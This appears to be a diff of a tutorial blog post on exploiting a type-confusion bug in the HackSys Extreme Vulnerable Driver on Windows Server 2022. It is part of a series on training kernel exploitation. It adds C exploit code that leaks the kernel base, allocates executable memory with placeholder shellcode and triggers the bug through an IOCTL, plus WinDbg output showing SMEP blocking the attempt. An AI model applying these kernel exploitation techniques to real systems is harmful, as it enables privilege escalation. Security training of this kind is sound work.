@@ -4,7 +4,7 @@
 
 ## We Have Code Execution
 
-At the end of part 1 we had code execution, we were able to pass a 16 byte buffer into the driver vio an IOCTL. If our target was Windows 7 we could simply write some shellcode, allocate some memory in user space, copy our shellcode to this memory, and trigger the type confuusion bug to execute our code. In modern Windows OSes, such as Server 2022, we can't do that.
+At the end of part 1 we had code execution, we were able to pass a 16 byte buffer into the driver vio an IOCTL. If our target was [Windows 7](https://github.com/plackyhacker/HEVD/blob/main/hevd_type_confusion.cpp) we could simply write some shellcode, allocate some memory in user space, copy our shellcode to this memory, and trigger the type confuusion bug to execute our code. In modern Windows OSes, such as Server 2022, we can't do that.
 
 ## Supervisor Mode Execution Prevention
 
@@ -67,8 +67,11 @@ The `EnumDeviceDrivers` Win32 API retrieves the load address for each device dri
 #include <Windows.h>
 #include <winternl.h>
 #include <psapi.h>
+#include <cstdint>
 
 typedef uint64_t QWORD;
+
+#define ARRAY_SIZE 1024
 
 QWORD GetKernelBase()
 {
@@ -79,13 +82,13 @@ QWORD GetKernelBase()
     return (QWORD)drivers[0];
 }
 
-int main() {
+int main(int argc, char* argv[]) {
   // get the base of the kernel
   QWORD kernelBase = GetKernelBase();
   printf("[+] Kernel base: 0x%p\n", kernelBase);
 
   // let's not trigger the bug yet!
-  return;
+  return 0;
 
   // get a handle to the driver
   HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
@@ -102,10 +105,111 @@ int main() {
   };
 
   DeviceIoControl(hDriver, 0x222023, (LPVOID)&someData, sizeof(someData), NULL, 0, NULL, NULL);
+
+  return 0;
 }
 ```
 
+When we run the exploit on our target we get:
+
+```
+HEVD.exe
+[+] Kernel base: 0xFFFFF80010A00000
+```
+
+We can check that it is correct in **WinDbg**:
+
+```
+1: kd> lm m nt
+Browse full module list
+start             end                 module name
+fffff800`10a00000 fffff800`11a47000   nt
+```
+
 Now we have the base address of the kernel we can search for code chunks or gadgets that we can chain together to acheive our goal.
+
+## Stack Pivoting
+
+We can execute code using the bug in the driver but we only control the first `call` to some code. Let's see what happens when we jump to some user space shellcode.
+
+First we will create a `struct` to represent the user mode data we will send to the driver:
+
+```c
+typedef struct _USER_TYPE_CONFUSION_OBJECT
+{
+    ULONG_PTR ObjectID;
+    ULONG_PTR ObjectType;
+} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;
+```
+
+Place this at the top of our exploit code and replace `someData` with this:
+
+```c
+USER_TYPE_CONFUSION_OBJECT userData = { 0 };
+userData.ObjectID = (ULONG_PTR)0x4141414141414141;
+userData.ObjectType = (ULONG_PTR)alloc;
+
+DeviceIoControl(hDriver, 0x222023, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);
+```
+
+This sends an address that we have allocated to the driver to be executed. Let's allocate this shellcode now (do this at the start of the main function):
+
+```c
+char shellcode[] = {
+  0xcc, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xcc
+};
+
+LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+if (!alloc)
+{
+  printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
+  return 1;
+}
+
+printf("[+] Memory allocated: 0x%p\n", alloc);
+
+// copy the shellcode in to the memory
+RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
+printf("[+] Shellcode copied to: 0x%p\n", alloc);
+```
+
+If you have done any user mode process injection this probably looks familiar. We can compile the exploit, connect our Kernel debugger, and execute the exploit on the Debugee. Ensure you remove the `return` statement that circumvented the bug.
+
+When we run the exploit **WinDbg** breaks:
+
+```
+*** Fatal System Error: 0x000000fc
+                       (0x0000023F34240000,0x000000011BCCF867,0xFFFFF68FDF4BC580,0x0000000080000005)
+
+Break instruction exception - code 80000003 (first chance)
+
+A fatal system error has occurred.
+Debugger entered on first try; Bugcheck callbacks have not been invoked.
+
+A fatal system error has occurred.
+
+For analysis of this file, run !analyze -v
+nt!DbgBreakPointWithStatus:
+fffff800`10e1edc0 cc              int     3
+```
+
+If we run `!analyze -v` to see what the bug check is:
+
+```
+0: kd> !analyze -v
+...
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
+...
+```
+
+This is Supervisor Mode Execution Prevention (SMEP) stopping Kernel mode from executing code in user space. We need to be a bit more creative to gain code execution.
 
 ## Return Oriented Programming
 
